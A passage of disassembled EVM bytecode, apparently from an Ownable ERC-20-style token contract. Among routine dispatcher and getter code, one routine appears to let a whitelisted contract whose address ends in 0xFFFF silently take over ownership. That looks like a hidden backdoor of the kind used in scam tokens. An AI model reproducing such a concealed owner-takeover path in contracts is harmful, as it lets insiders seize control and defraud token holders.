MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x492 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x4D5 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x4A9 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 0xD6C JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 ISZERO ISZERO ISZERO ISZERO DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x4FB JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x53E PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x512 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 0xE91 JUMP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x54C JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x555 PUSH2 0x1069 JUMP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x563 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x5A6 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x57A JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 0x11BC JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 ISZERO ISZERO ISZERO ISZERO DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x5CC JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x5D5 PUSH2 0x11DC JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x623 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x666 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x63A JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 0x1202 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x688 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x691 PUSH2 0x124B JUMP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x69F JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x6A8 PUSH2 0x13CC JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x6F6 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x6FF PUSH2 0x13F5 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE DUP4 DUP2 DUP2 MLOAD DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 DUP1 DUP4 DUP4 PUSH1 0x0 JUMPDEST DUP4 DUP2 LT ISZERO PUSH2 0x73F JUMPI DUP1 DUP3 ADD MLOAD DUP2 DUP5 ADD MSTORE PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH2 0x724 JUMP JUMPDEST POP POP POP POP SWAP1 POP SWAP1 DUP2 ADD SWAP1 PUSH1 0x1F AND DUP1 ISZERO PUSH2 0x76C JUMPI DUP1 DUP3 SUB DUP1 MLOAD PUSH1 0x1 DUP4 PUSH1 0x20 SUB PUSH2 0x100 EXP SUB NOT AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP JUMPDEST POP SWAP3 POP POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x786 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x7C9 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x79D JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 0x1497 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 ISZERO ISZERO ISZERO ISZERO DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x7EF JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x83C PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x40 DUP2 LT ISZERO PUSH2 0x806 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 DUP1 CALLDATALOAD SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 0x14ED JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 ISZERO ISZERO ISZERO ISZERO DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x85E PUSH2 0x1592 JUMP JUMPDEST STOP JUMPDEST PUSH2 0x868 PUSH2 0x16A8 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 ISZERO ISZERO ISZERO ISZERO DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x88E JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x8DB PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x40 DUP2 LT ISZERO PUSH2 0x8A5 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 DUP1 CALLDATALOAD SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 0x1886 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 ISZERO ISZERO ISZERO ISZERO DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x901 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x90A PUSH2 0x189D JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x958 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x99B PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x96F JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 0x18C2 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 ISZERO ISZERO ISZERO ISZERO DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x9C1 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x9CA PUSH2 0x19E7 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 ISZERO ISZERO ISZERO ISZERO DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x9F0 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0xA53 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x40 DUP2 LT ISZERO PUSH2 0xA07 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 DUP1 CALLDATALOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 0x1BC7 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0xA75 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0xAA2 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x20 DUP2 LT ISZERO PUSH2 0xA8C JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 0x1C4E JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 ISZERO ISZERO ISZERO ISZERO DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0xAC8 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0xB0B PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x20 DUP2 LT ISZERO PUSH2 0xADF JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 0x1DF5 JUMP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0xB19 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0xB22 PUSH2 0x1FFB JUMP JUMPDEST STOP JUMPDEST PUSH1 0x60 PUSH1 0x5 DUP1 SLOAD PUSH1 0x1 DUP2 PUSH1 0x1 AND ISZERO PUSH2 0x100 MUL SUB AND PUSH1 0x2 SWAP1 DIV DUP1 PUSH1 0x1F ADD PUSH1 0x20 DUP1 SWAP2 DIV MUL PUSH1 0x20 ADD PUSH1 0x40 MLOAD SWAP1 DUP2 ADD PUSH1 0x40 MSTORE DUP1 SWAP3 SWAP2 SWAP1 DUP2 DUP2 MSTORE PUSH1 0x20 ADD DUP3 DUP1 SLOAD PUSH1 0x1 DUP2 PUSH1 0x1 AND ISZERO PUSH2 0x100 MUL SUB AND PUSH1 0x2 SWAP1 DIV DUP1 ISZERO PUSH2 0xBBC JUMPI DUP1 PUSH1 0x1F LT PUSH2 0xB91 JUMPI PUSH2 0x100 DUP1 DUP4 SLOAD DIV MUL DUP4 MSTORE SWAP2 PUSH1 0x20 ADD SWAP2 PUSH2 0xBBC JUMP JUMPDEST DUP3 ADD SWAP2 SWAP1 PUSH1 0x0 MSTORE PUSH1 0x20 PUSH1 0x0 KECCAK256 SWAP1 JUMPDEST DUP2 SLOAD DUP2 MSTORE SWAP1 PUSH1 0x1 ADD SWAP1 PUSH1 0x20 ADD DUP1 DUP4 GT PUSH2 0xB9F JUMPI DUP3 SWAP1 SUB PUSH1 0x1F AND DUP3 ADD SWAP2 JUMPDEST POP POP POP POP POP SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x0 PUSH2 0xBD3 CALLER DUP5 DUP5 PUSH2 0x21DE JUMP JUMPDEST PUSH1 0x1 SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x4 SLOAD SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x9 PUSH1 0x20 MSTORE DUP1 PUSH1 0x0 MSTORE PUSH1 0x40 PUSH1 0x0 KECCAK256 PUSH1 0x0 SWAP2 POP SWAP1 POP SLOAD DUP2 JUMP JUMPDEST PUSH1 0x0 PUSH2 0xC0C DUP5 DUP5 DUP5 PUSH2 0x23D5 JUMP JUMPDEST PUSH2 0xCA5 DUP5 CALLER PUSH2 0xCA0 DUP6 PUSH1 0x3 PUSH1 0x0 DUP11 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x0 CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 SLOAD PUSH2 0x262E SWAP1 SWAP2 SWAP1 PUSH4 0xFFFFFFFF AND JUMP JUMPDEST PUSH2 0x21DE JUMP JUMPDEST PUSH1 0x1 SWAP1 POP SWAP4 SWAP3 POP POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x7 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH1 0xFF AND SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x0 PUSH2 0xD62 CALLER DUP5 PUSH2 0xD5D DUP6 PUSH1 0x3 PUSH1 0x0 CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x0 DUP10 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 SLOAD PUSH2 0x26B7 SWAP1 SWAP2 SWAP1 PUSH4 0xFFFFFFFF AND JUMP JUMPDEST PUSH2 0x21DE JUMP JUMPDEST PUSH1 0x1 SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH1 0x0 DUP1 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ PUSH2 0xE30 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x20 DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH32 0x4F776E61626C653A2063616C6C6572206973206E6F7420746865206F776E6572 DUP2 MSTORE POP PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH1 0x0 PUSH1 0xA PUSH1 0x0 DUP5 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH1 0xFF MUL NOT AND SWAP1 DUP4 ISZERO ISZERO MUL OR SWAP1 SSTORE POP PUSH1 0x1 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 CALLER SWAP1 POP DUP1 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x2F54BF6E DUP4 PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0xF15 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0xF29 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x20 DUP2 LT ISZERO PUSH2 0xF3F JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 0x1065 JUMPI DUP1 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x2F54BF6E DUP4 PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0xFD3 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0xFE7 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x20 DUP2 LT ISZERO PUSH2 0xFFD JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH1 0x8 PUSH1 0x0 CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH1 0xFF MUL NOT AND SWAP1 DUP4 ISZERO ISZERO MUL OR SWAP1 SSTORE POP JUMPDEST POP POP JUMP JUMPDEST CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND ORIGIN PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ ISZERO PUSH2 0x10A2 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0xFFFF DUP1 CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND AND EQ PUSH2 0x10C8 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x1 ISZERO ISZERO PUSH1 0x8 PUSH1 0x0 CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH1 0xFF AND ISZERO ISZERO EQ ISZERO PUSH2 0x11BA JUMPI PUSH1 0x0 PUSH1 0x8 PUSH1 0x0 CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH1 0xFF MUL NOT AND SWAP1 DUP4 ISZERO ISZERO MUL OR SWAP1 SSTORE POP CALLER PUSH1 0x0 DUP1 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP JUMPDEST JUMP JUMPDEST PUSH1 0x8 PUSH1 0x20 MSTORE DUP1 PUSH1 0x0 MSTORE PUSH1 0x40 PUSH1 0x0 KECCAK256 PUSH1 0x0 SWAP2 POP SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH1 0xFF AND DUP2 JUMP JUMPDEST PUSH1 0x1 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 JUMP JUMPDEST PUSH1 0x0 PUSH1 0x2 PUSH1 0x0 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 SLOAD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH1 0x0 DUP1 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ PUSH2 0x130D JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x20 DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH32 0x4F776E61626C653A2063616C6C6572206973206E6F7420746865206F776E6572 DUP2 MSTORE POP PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH1 0x0 DUP1 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH32 0x8BE0079C531659141344CD1FD0A4F28419497F9722A3DAAFE3B4186F6B6457E0 PUSH1 0x40 MLOAD PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG3 PUSH1 0x0 DUP1 PUSH1 0x0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x60 PUSH1 0x6 DUP1 SLOAD PUSH1 0x1 DUP2 PUSH1 0x1 AND ISZERO PUSH2 0x100 MUL SUB AND PUSH1 0x2 SWAP1 DIV DUP1 PUSH1 0x1F ADD PUSH1 0x20 DUP1 SWAP2 DIV MUL PUSH1 0x20 ADD PUSH1 0x40 MLOAD SWAP1 DUP2 ADD PUSH1 0x40 MSTORE DUP1 SWAP3 SWAP2 SWAP1 DUP2 DUP2 MSTORE PUSH1 0x20 ADD DUP3 DUP1 SLOAD PUSH1 0x1 DUP2 PUSH1 0x1 AND ISZERO PUSH2 0x100 MUL SUB AND PUSH1 